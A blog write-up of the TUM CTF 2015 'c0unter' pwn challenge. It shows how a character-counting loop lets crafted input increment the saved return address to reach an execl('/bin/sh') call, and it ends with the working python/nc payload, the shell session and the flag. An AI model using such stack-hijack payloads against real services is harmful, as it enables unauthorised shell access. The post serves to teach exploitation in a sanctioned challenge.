---
layout: post
title:  "TUM CTF 2015 Teaser - c0unter (pwn 25)"
date:   2015-10-30 20:00
categories: ctf exploit
---

I had the possiblity to play a few hours on [TUM CTF Teaser][tum]. It was
nicely organized and the challenges were fun to solve - even for the easy ones.
Here is the first write-up I am going to publish for that CTF.

#Basic information

From the organizers:
{% highlight text %}
Pwn / c0unter
Baby's 1st
ctf.link/assets/downloads/pwn/counter
nc 1.ctf.link 1031
25 Points
{% endhighlight %}

We are facing an ELF 64-bit binary, stripped and with only NX enabled:
{% highlight shell-session %}
$ file counter
counter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=b065123973be4586a6b10f277cda428776bde80b, stripped

$ checksec --file counter
RELRO           STACK CANARY      NX            PIE
No RELRO        No canary found   NX enabled    No PIE
RPATH      RUNPATH      FILE
No RPATH   No RUNPATH   counter
{% endhighlight %}

By looking at the relocation table, we can see that the binary must have
somewhere a call to `execl` and another to `fscanf`:
{% highlight shell-session %}
$ objdump -R counter

counter:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600c68 R_X86_64_GLOB_DAT  __gmon_start__
0000000000600d00 R_X86_64_COPY     stdin
0000000000600c88 R_X86_64_JUMP_SLOT  free
0000000000600c90 R_X86_64_JUMP_SLOT  __isoc99_fscanf     <=
0000000000600c98 R_X86_64_JUMP_SLOT  puts
0000000000600ca0 R_X86_64_JUMP_SLOT  __libc_start_main
0000000000600ca8 R_X86_64_JUMP_SLOT  __gmon_start__
0000000000600cb0 R_X86_64_JUMP_SLOT  malloc
0000000000600cb8 R_X86_64_JUMP_SLOT  exit
0000000000600cc0 R_X86_64_JUMP_SLOT  execl               <=
{% endhighlight %}

#Disassembling

When interacting with the service, no welcome message or instruction is
provided, it only seems to echo our input. The call to fscanf is made at `0x40074f`:
{% highlight shell-session %}
$ objdump -M intel -d counter
[snip]
40074f: e8 0c fe ff ff        call   400560 <__isoc99_fscanf@plt>
[snip]
{% endhighlight %}

In GDB with [peda][peda], we can see the arguments given to `fscanf`:
{% highlight shell-session %}
gdb-peda$ b *0x40074f
Breakpoint 1 at 0x40074f
gdb-peda$ r
[snip]
Guessed arguments:
arg[0]: 0x7ffff7dd5900 --> 0xfbad2088 
arg[1]: 0x4008dc --> 0x7331313525 ('%511s')
arg[2]: 0x600d40 --> 0x0 
arg[3]: 0x0 
[snip]
{% endhighlight %}

The first argument is the address of `stdin` in the glibc, the second argument
is the format used to interpret our input and the third argument is the address
of the destination buffer where our input is stored.

Between `0x400794` and `0x4007ae` we can see that the code loops over the buffer, count the occurence of each character of our input and save that information on the stack:

{% highlight shell-session %}
0x400794: mov    eax,0x600d40             ; address of the buffer
0x400799: lea    rcx,[rbp+rax*1+0x0]      ; number of bytes read by fscanf
0x40079e: xchg   ax,ax
0x4007a0: movzx  edx,BYTE PTR [rax]       ; get the value of the current byte
0x4007a3: add    rax,0x1                  ; offset of the next char
0x4007a7: add    BYTE PTR [rsp+rdx*1],0x1 ; increment the counter of this byte
                                          ; by 1
0x4007ab: cmp    rax,rcx
0x4007ae: jne    0x4007a0
{% endhighlight %}

This can be interpreted as the following C code:
{% highlight c %}
for (i = 0; i < input_length; ++i) {
  *(rsp + input[i]) += 1;
}
{% endhighlight %}

As a byte can contain a value between 0x00 and 0xff, we can manipulate the
stack from its top to 256 bytes further. If the saved `rip` value is contained
within that range, we can hijack the flow of the program.

Here is an example where I've fed the binary with the string `AAAABBBBCCCCDDDD`. To do that I usually create a `fifo`:
{% highlight shell-session %}
$ mkfifo fifo
{% endhighlight %}

In gdb, I use it to feed the binary through its standard input:
{% highlight shell-session %}
gdb-peda$ r < fifo
{% endhighlight %}

And in another shell, I can use any commands to feed the fifo:
{% highlight shell-session %}
$ echo 'AAAABBBBCCCCDDDD' > fifo
$ echo -e -n '\xde\xad\xbe\xef' > fifo
$ python2 -c 'print "..."' > fifo
$ ./script > fifo
{% endhighlight %}

Here is the stack before executing the vulnerable function:
{% highlight shell-session %}
gdb-peda$ x/22gx $rsp
0x7fffffffdc00:	0x0000000000000000	0x0000000000000000
0x7fffffffdc10:	0x0000000000000000	0x0000000000000000
0x7fffffffdc20:	0x0000000000000000	0x0000000000000000
0x7fffffffdc30:	0x0000000000000000	0x0000000000000000
0x7fffffffdc40:	0x0000000000000000	0x0000000000000000
0x7fffffffdc50:	0x0000000000000000	0x0000000000000000
0x7fffffffdc60:	0x0000000000000000	0x0000000000000000
0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
0x7fffffffdc80:	0x0000000000400850	0x0000000000000000
0x7fffffffdc90:	0x0000000000400850	0x00000000004005d9
0x7fffffffdca0:	0x0000000000000000	0x00007ffff7a57610
{% endhighlight %}

And here it is after the execution of the vulnerable function:
{% highlight shell-session %}
gdb-peda$ x/22gx $rsp
0x7fffffffdc00:	0x0000000000000000	0x0000000000000000
0x7fffffffdc10:	0x0000000000000000	0x0000000000000000
0x7fffffffdc20:	0x0000000000000000	0x0000000000000000
0x7fffffffdc30:	0x0000000000000000	0x0000000000000000
0x7fffffffdc40:	0x0000000404040400	0x0000000000000000
0x7fffffffdc50:	0x0000000000000000	0x0000000000000000
0x7fffffffdc60:	0x0000000000000000	0x0000000000000000
0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
0x7fffffffdc80:	0x0000000000400850	0x0000000000000000
0x7fffffffdc90:	0x0000000000400850	0x00000000004005d9
0x7fffffffdca0:	0x0000000000000000	0x00007ffff7a57610
{% endhighlight %}

You can see that the bytes between addresses `0x7fffffffdc41` and
`0x7fffffffdc44` have been incremented by 4. These addresses correspond to the
address of `rsp`, `0x7fffffffdc00`, plus the value in bytes of `A`, `B`, `C`
and `D`: `0x41`, `0x42`, `0x43` and `0x44` respectively. You may find more
information about ASCII characters value in hexadecimal [here][ascii].

#Exploitation

Here is the information about the current stack frame, when the vulnerable code is executed:
{% highlight shell-session %}
gdb-peda$ i frame
Stack level 0, frame at 0x7fffffffdca0:
 rip = 0x40074f; saved rip = 0x4005d9
 called by frame at 0x7fffffffdcb0
 Arglist at 0x7fffffffdbf8, args: 
 Locals at 0x7fffffffdbf8, Previous frame's sp is 0x7fffffffdca0
 Saved registers:
  rbx at 0x7fffffffdc88, rbp at 0x7fffffffdc90, rip at 0x7fffffffdc98
{% endhighlight %}

The distance from the top of the stack (`rsp`) and the location of the saved `rip` is 152 bytes:
{% highlight shell-session %}
gdb-peda$ distance $rsp 0x7fffffffdc98
From 0x7fffffffdc00 to 0x7fffffffdc98: 152 bytes, 38 dwords
gdb-peda$
{% endhighlight %}

If we send to the binary bytes having values between 152 (`0x98`) and 160 (`0xa0`),
we can change the value of the saved `rip` and control the flow of the program
when the current function return.

As mentionned earlier, there is at least a call to `execl` somewhere is the code:
{% highlight shell-session %}
$ objdump -M intel -d counter | grep -B 5 execl
[snip]
4006e0:	bf d4 08 40 00       	mov    edi,0x4008d4
4006e5:	48 83 ec 08          	sub    rsp,0x8
4006e9:	31 d2                	xor    edx,edx
4006eb:	be d9 08 40 00       	mov    esi,0x4008d9
4006f0:	31 c0                	xor    eax,eax
4006f2:	e8 c9 fe ff ff       	call   4005c0 <execl@plt>
[snip]
{% endhighlight %}

This shows to complete call to `execl`:

* the first argument is a string located at `0x4008d4`
* the second argument is a string located at `0x4008d9`
* and the third argument is `0` (`xor    edx,edx`), which is used to indicate
  the end of the arguments list. Here are the strings:
{% highlight shell-session %}
gdb-peda$ x/s 0x4008d4
0x4008d4:	"/bin/sh"
gdb-peda$ x/s 0x4008d9
0x4008d9:	"sh"
{% endhighlight %}

This gives us the following call: `execl("/bin/sh", "sh");`

Let's replace the saved `rip` with `0x4006e0` so that we can spawn a shell when
the function returns.  Saved `rip` minus the address of the call to execl will
give us the number of characters we have to use:

`0x4006e0 - 0x4005d9 = 0x0107` or `0xe0 - 0xd9 = 0x07` and `0x06 - 0x05 = 0x01`

This means that the lowest byte of saved `rip` must be incremented 7 times and
the next one, once:
{% highlight shell-session %}
$ (python2 -c 'print 7 * "\x98" + "\x99" + "\0\0\0\0"'; cat) \
  | nc -v 1.ctf.link 1031
Connection to 1.ctf.link 1031 port [tcp/*] succeeded!
id
uid=1000(counter) gid=1000(counter) groups=1000(counter)
ls -la
total 32
drwxr-xr-x 2 root root 4096 Oct 24 21:00 .
drwxr-xr-x 6 root root 4096 Oct 24 21:00 ..
-rwxr-xr-x 1 root root 5384 Oct 24 00:38 counter
-rw-r--r-- 1 root root   32 Oct 24 12:59 flag.txt
-rwxr-xr-x 1 root root 9384 Oct 24 15:51 ynetd
cat flag.txt
hxp{0verflow1ng_ch4c4cters_w1n}
{% endhighlight %}

Pwned for the glory of the almighty technoviking!
![technoviking](https://www.zazzle.com/rlv/techno_viking_by_redrevolt_make_me_proud_poster-r40c1f27408414a17b6c3c70d65458264_w1t_8byvr_512.jpg)

[tum]: https://ctftime.org/event/238
[peda]: https://github.com/longld/peda
[ascii]: http://www.asciitable.com/
